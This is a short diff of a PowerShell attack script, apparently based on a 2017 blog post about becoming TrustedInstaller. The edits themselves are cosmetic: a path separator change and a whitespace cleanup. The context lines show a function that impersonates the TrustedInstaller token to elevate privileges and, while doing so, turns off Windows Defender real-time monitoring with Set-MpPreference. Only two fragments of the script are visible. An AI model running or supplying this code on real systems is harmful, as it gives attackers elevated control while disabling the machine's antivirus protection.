@@ -1,6 +1,6 @@
 # Source: https://www.tiraniddo.dev/2017/08/the-art-of-becoming-trustedinstaller.html
 
-Import-Module ./NtObjectManager.psm1
+Import-Module .\NtObjectManager.psm1
 
 # Steals the TrustedInstaller process token to elevate privileges
 # Works for any user with SeImpersonatePrivilege and/or SeDebugPrivilege enabled
@@ -16,7 +16,7 @@ function Invoke-TrustedInstaller {
     $imp = $current.Impersonate($ti_thread)
 
     Set-MpPreference -DisableRealtimeMonitoring $true
-    
+
     $imp_token = Get-NtToken -Impersonation
     $imp_token.Groups | Where-Object { $_.Sid.name -match 'TrustedInstaller' }
 }
